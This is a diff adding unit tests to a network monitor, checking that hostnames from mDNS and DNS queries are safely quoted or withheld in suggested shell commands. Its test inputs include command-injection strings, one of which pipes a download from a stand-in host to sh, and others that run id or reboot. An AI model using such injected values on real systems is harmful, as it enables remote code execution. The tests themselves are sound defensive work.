@@ -117,5 +117,71 @@ class TestBacnetAcknowledgements(unittest.TestCase):
         self.assertEqual(findings[0].severity, 'critical')
 
 
+# ─── M18: shell text in a suggested command ──────────────────────────────────
+
+class TestSuggestedCommandsCarryNoShell(unittest.TestCase):
+    """
+    `next_check` is pasted into a root shell, and the names in it come from
+    mDNS and DNS queries anyone on the network can send.
+    """
+
+    HOSTILE = ("printer$(touch /tmp/owned).local",
+               "x'; curl http://203.0.113.9/s | sh; echo '",
+               'name`id`', 'a;reboot', 'two\nlines')
+
+    def unanswered(self, name):
+        import netmon.handlers  # noqa: F401 -- registers the handler
+        from netmon.events import Event
+        from netmon.rules_engine import Rule
+        rule = Rule({'id': 'unanswered_name', 'type': 'stateful',
+                     'handler': 'unanswered_name', 'params': {'min_queries': 1}})
+        event = Event(kind='mdns', src_ip='192.168.10.20', ts=1000.0,
+                      fields={'query': name})
+        findings = rule.evaluate(event)
+        self.assertEqual(len(findings), 1)
+        return findings[0].next_check
+
+    def test_the_unanswered_name_is_one_quoted_word(self):
+        import shlex
+        for name in self.HOSTILE + ('Büro Drucker.local',):
+            with self.subTest(name=name):
+                command = self.unanswered(name).split('; if it', 1)[0]
+                self.assertEqual(shlex.split(command), ['nslookup', name.lower()])
+
+    def rendered(self, template, **fields):
+        from netmon.events import Event
+        from netmon.rules_engine import Rule
+        rule = Rule({'id': 't', 'when': {'kind': 'tls'}, 'next_check': template})
+        event = Event(kind='tls', src_ip='192.168.10.20', fields=fields)
+        return rule.evaluate(event)[0].next_check
+
+    def test_a_template_value_with_shell_characters_is_withheld(self):
+        from netmon.rules_engine import UNSAFE_VALUE
+        template = ("tshark -r <pcap> -Y 'tls.handshake.extensions_server_name "
+                    "contains \"{sni}\"'")
+        for value in self.HOSTILE:
+            with self.subTest(value=value):
+                command = self.rendered(template, sni=value)
+                self.assertIn(UNSAFE_VALUE, command)
+                self.assertNotIn(value, command)
+
+    def test_ordinary_names_are_left_as_they_are(self):
+        """Spaces and letters from any script: mDNS names have both."""
+        for value in ('relay-9f2.net.example.test', 'Büro Drucker',
+                      'fe80::1%eth0', '00:11:22:33:44:55', 'Kåre’s laptop'):
+            with self.subTest(value=value):
+                self.assertEqual(self.rendered("echo '{sni}'", sni=value),
+                                 f"echo '{value}'")
+
+    def test_descriptions_are_not_affected(self):
+        """Only the command is pasted anywhere; a description is shown as text."""
+        from netmon.events import Event
+        from netmon.rules_engine import Rule
+        rule = Rule({'id': 't', 'when': {'kind': 'tls'},
+                     'describe': 'reached {sni}'})
+        event = Event(kind='tls', fields={'sni': 'a;b'})
+        self.assertEqual(rule.evaluate(event)[0].description, 'reached a;b')
+
+
 if __name__ == '__main__':
     unittest.main(verbosity=2)
